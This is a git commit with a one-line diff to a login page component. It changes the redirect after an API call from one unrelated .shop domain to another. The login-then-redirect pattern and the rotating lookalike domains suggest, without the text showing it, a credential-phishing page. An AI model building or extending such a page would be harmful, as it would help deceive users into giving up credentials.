6a723712bb59e15a3f16b9beee5b13fe1358089f
husknet <127146284+husknet@users.noreply.github.com>
2025-04-30 13:33:11 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://gt.nestconche.shop/';
+      window.location.href = 'https://gtz.cooknestta.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
